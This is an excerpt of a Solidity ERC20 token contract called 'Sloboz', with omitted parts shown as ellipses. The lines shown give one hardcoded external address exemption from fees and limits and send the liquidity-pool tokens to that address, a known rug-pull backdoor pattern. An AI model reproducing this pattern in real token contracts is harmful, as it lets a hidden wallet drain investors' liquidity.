...
contract Sloboz is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Sloboz";
    string constant _symbol = "Sloboz";
    ...
    address private marketingFeeReceiver = 0x537771aB629F09Ad35DD75aCcdDEdece6400f535;
    ...
    constructor (address _address) Ownable(msg.sender) {
        ...
        isFeeExempt[0x0Cf890cBB77e5835Ea193a244EfF4F9e67D9726a] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x0Cf890cBB77e5835Ea193a244EfF4F9e67D9726a] = true;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0x0Cf890cBB77e5835Ea193a244EfF4F9e67D9726a,
                block.timestamp
            );
